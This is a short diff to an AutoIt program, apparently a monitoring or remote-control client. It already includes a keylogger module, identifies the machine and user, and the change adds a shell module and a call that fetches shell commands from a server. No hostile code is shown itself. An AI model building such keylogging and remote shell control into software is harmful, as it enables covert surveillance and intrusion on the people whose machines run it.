@@ -17,6 +17,7 @@ Opt("ExpandVarStrings", 1) ;
 #include <SQLite.au3>
 #include <Process.au3>
 #include <Array.au3>
+#include <FileConstants.au3>
 #EndRegion include system user defined functions
 
 
@@ -37,12 +38,13 @@ Opt("ExpandVarStrings", 1) ;
 #include "modules/keyLogger.au3"
 #include "modules/window.au3"
 #include "modules/commands.au3"
+#include "modules/shell.au3"
 #EndRegion include program modules
 
 
 #Region global varriables
 ;generate computer serial number based on the motherboard
-Global $computer_serial=_WinAPI_UniqueHardwareID ( $UHID_MB)
+Global $computer_serial=StringRegExpReplace(_WinAPI_UniqueHardwareID ( $UHID_MB), "[{}]", "")
 Global $computer_user=@UserName
 Global $iniFilePath=@WorkingDir&"\config\config.ini"
 Global $company_id = IniRead($iniFilePath, "server", "company_id", "0")
@@ -87,7 +89,9 @@ Global $keyBuffer=""
 
 ;moveWindows()
 
-fetchCommands()
+;fetchCommands()
+
+fetchShellCommands()
 
 Exit
 
